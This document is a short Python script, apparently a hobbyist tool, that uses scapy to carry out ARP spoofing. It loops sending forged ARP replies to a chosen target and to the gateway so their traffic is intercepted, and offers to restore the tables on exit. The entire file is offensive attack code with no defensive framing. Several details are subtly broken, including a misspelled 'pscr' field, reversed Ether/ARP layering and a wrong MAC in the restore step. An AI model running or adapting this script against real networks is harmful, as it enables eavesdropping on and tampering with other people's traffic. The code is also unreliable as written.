# Start Imports.
import scapy.all as scapy
import time , sys

def Banner():
	# One Line Banner
	Ban = "\t\t\t\t\t[+] << ARP-SP00F (MITM) >> [+]"
	print(Ban)

Banner()
Address = input("\nTarget IP >> ")
MainIP = input("Network IP >> ")
Packets = 0

def MAC_SCAN(ip):
	arp = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	ARP_Req_broadcast = arp/broadcast
	answerd = scapy.srp(ARP_Req_broadcast,timeout=1,verbose=False)[0]
	return answerd[0][1].hwsrc

def SPOOF(target,network):
	target_MAC = MAC_SCAN(target) # Get The Victim MAC Address
	packet = scapy.ARP(op=2,pdst=target,hwdst=target_MAC,pscr=network) # Create The Packet To Send TO The Victim/Router.
	scapy.send(packet,verbose=False) # Send The Package Using Scapy

def restore(dist_ip,real_ip):
	dist_MAC = MAC_SCAN(dist_ip)
	real_MAC = MAC_SCAN(real_ip)
	packet = scapy.ARP(op=2,pdst=dist_ip,hwdst=real_MAC,pscr=real_ip,hwsrc=real_MAC)
	scapy.send(packet,count=4,verbose=False)

try:
	while True:
		SPOOF(Address,MainIP) #--\ Send A Request To Address Once
		SPOOF(MainIP,Address) #--/ Then Send Another Request To The Router.
		Packets += 2 # Add 2 To The Total Number Of Packets After Sent The Requests
		print("\r[+] Successful Send {0} Packets".format(str(Packets)), end="") # Print The Number Of Sent Packets
		sys.stdout.flush() # Keep The Print AT Same Line
		time.sleep(2.4) # Wait For 2.4 Seconds
except KeyboardInterrupt:
	print("\nCancel.")
	answer = input("Do you want to restore every thing? (Y)es or (N)o: ")
	if answer.lower() == "y":
		restore(Address,MainIP)
	elif answer.lower() == "n":
		print("Ok!")
		sys.exit()
	else: # Auto Exit If There Is Wrong Answer.
		sys.exit()
